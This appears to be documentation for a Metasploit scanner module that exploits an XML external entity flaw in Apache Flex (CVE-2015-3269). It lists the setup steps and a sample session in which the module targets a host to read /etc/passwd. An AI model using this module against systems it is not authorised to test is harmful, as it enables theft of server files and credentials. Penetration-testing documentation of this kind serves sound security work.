## Description

This module exploits a vulnerabilty in Apache Flex. XXE Injection, CVE-2015-3269 

## Verification Steps

1. Do: ```use auxiliary/scanner/http/apacheflex_xxe```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do  ```set FILE [FILE] ``
4. Do: ```run```

## Scenarios

```
msf auxiliary(scanner/http/apacheflex_xxe) > set rport 8080
rport => 8080
msf auxiliary(scanner/http/apacheflex_xxe) > show options

Module options (auxiliary/scanner/http/apacheflex_xxe):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   FILE     /etc/passwd      yes       File Acess
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.0.1      yes       The target address range or CIDR identifier
   RPORT    8080             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf auxiliary(scanner/http/apacheflex_xxe) > run
```

